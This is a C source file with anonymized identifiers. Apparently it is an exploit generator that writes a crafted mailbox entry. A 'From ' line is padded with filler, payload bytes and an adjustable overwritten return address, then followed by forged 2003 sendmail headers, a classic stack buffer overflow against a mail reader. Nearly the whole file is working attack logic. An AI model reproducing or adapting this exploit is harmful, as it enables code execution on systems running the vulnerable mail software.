
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int VAR_0 ;
 int VAR_1 ;
 long VAR_2 ;
 long FUNC_0 (char*) ;
 char* VAR_3 ;
 int FUNC_1 (int) ;
 int FUNC_2 (int *) ;
 int * FUNC_3 (char*,char*) ;
 int FUNC_4 (int ,char*,...) ;
 int FUNC_5 (char*,int *) ;
 int FUNC_6 (char*) ;
 char FUNC_7 (int,char**,char*) ;
 char* FUNC_8 (int) ;
 char* VAR_4 ;
 int FUNC_9 (char*) ;
 int VAR_5 ;
 int * VAR_6 ;
 int FUNC_10 (char*,char*) ;
 int FUNC_11 (char*,char*) ;
 int FUNC_12 (char*) ;

int FUNC_13(int VAR_7, char **VAR_8) {
  int VAR_9 = 0, VAR_10 = 0;
  char VAR_11, *VAR_12 = ((void*)0), *VAR_13 = ((void*)0), VAR_14[5 + VAR_0 + 6 + 2 + 3 + 1 + 3 + 2 + 1 + 8 + 1 + 4 + 2];
  long VAR_15 = VAR_2, *VAR_16 = ((void*)0);
  FILE *VAR_17;

  if(VAR_7 < 2) {
    FUNC_4(VAR_5, "usage: %s <-m outfile> [-o offset] [-h]\n", VAR_8[0]);
    FUNC_1(1);
  }

  while((VAR_11 = FUNC_7(VAR_7, VAR_8, "m:o:h")) != -1) {
    switch(VAR_11) {
      case 'h':
        FUNC_4(VAR_5, "usage: %s <-m outfile> [-o offset] [-h]\n", VAR_8[0]);
        FUNC_1(1);
      break;

      case 'o':
        VAR_15 -= FUNC_0(VAR_4);
      break;

      case 'm':
        if(!(VAR_12 = FUNC_8(FUNC_12(VAR_4)+1))) {
          FUNC_9("malloc");
          FUNC_1(1);
        }
        FUNC_11(VAR_12, VAR_4);
      break;
    }
  }

  if(!VAR_12) {
    FUNC_4(VAR_5, "usage: %s <-m outfile> [-o offset] [-h]\n", VAR_8[0]);
    FUNC_1(1);
  }

  FUNC_4(VAR_5, "[+] ret 0x%lx\n", VAR_15);

  FUNC_11(VAR_14, "From ");
  VAR_13 = VAR_14 + 5;


  for(VAR_9=0; VAR_9<VAR_0-FUNC_12(VAR_3)-4; VAR_9++)
    *(VAR_13++) = VAR_1;


  for(VAR_9=0; VAR_9<FUNC_12(VAR_3); VAR_9++)
    *(VAR_13++) = VAR_3[VAR_9];


  VAR_16 = (long *)VAR_13;
  for(VAR_9=0; VAR_9<4; VAR_9+=4)
    *(VAR_16++) = VAR_15;


  *(VAR_13+4) = 0;
  FUNC_10(VAR_14, "@foo.bar  Thu Jun 26 16:45:16 2003\n");


  if(VAR_12) {
    if(!(VAR_17 = FUNC_3(VAR_12, "a"))) {
      FUNC_9("fopen");
      FUNC_1(1);
    }
    FUNC_4(VAR_5, "[+] out %s\n", VAR_12);
  } else {
    VAR_17 = VAR_6;
    FUNC_4(VAR_5, "[+] out stdout\n");
  }

  FUNC_5(VAR_14, VAR_17);
  FUNC_5("Return-Path: <root@foo.bar>\n", VAR_17);
  FUNC_5("Received: from localhost (localhost [127.0.0.1])", VAR_17);
  FUNC_5("\tby localhost (8.12.4/8.12.4) with ESMTP id h5QNPG2q003945\n", VAR_17);
  FUNC_5("\tfor <root@foo.bar>; Thu, 26 Jun 2003 16:45:16 -0700\n", VAR_17);
  FUNC_5("Received: (from root@foo.bar)\n", VAR_17);
  FUNC_5("\tby localhost (8.12.4/8.12.4/Submit) id h5QNPGuc004172\n", VAR_17);
  FUNC_5("\tfor root; Thu, 26 Jun 2003 16:45:16 -0700\n", VAR_17);
  FUNC_5("Date: Thu, 26 Jun 2003 16:45:12 -0700\n", VAR_17);
  FUNC_5("From: root@foo.bar\n", VAR_17);
  FUNC_5("Message-Id: <200306262325.h5QNPGuc003744@localhost>\n", VAR_17);
  FUNC_5("To: root@foo.bar\n", VAR_17);
  FUNC_5("Subject: foobar\n\n", VAR_17);
  FUNC_5("foobar\n\n", VAR_17);

  FUNC_2(VAR_17);
  FUNC_6(VAR_12);
  FUNC_1(0);
}
